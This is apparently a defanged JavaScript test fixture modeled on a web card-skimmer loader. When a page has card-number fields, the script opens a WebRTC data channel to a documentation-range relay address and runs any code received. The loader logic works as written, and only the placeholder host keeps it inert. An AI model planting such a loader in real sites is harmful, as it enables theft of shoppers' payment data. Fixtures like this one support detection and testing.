// DEFANGED TEST FIXTURE: modeled on the PaperCut loader (Guardio Labs, Nov 2026).
// The file itself steals nothing: it opens a WebRTC data channel to a relay and runs
// whatever code the relay sends, so the real skimmer never exists as a downloadable file.
// 198.51.100.7 is a documentation address (TEST-NET-2) and routes nowhere.
(function () {
  if (!document.querySelector('input[autocomplete="cc-number"], input[name*="card"]')) return;
  var pc = new RTCPeerConnection({ iceServers: [{ urls: "turn:198.51.100.7:40000", username: "x", credential: "y" }] });
  var ch = pc.createDataChannel("j");
  ch.onmessage = function (e) {
    (new Function(e.data))();
  };
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
})();
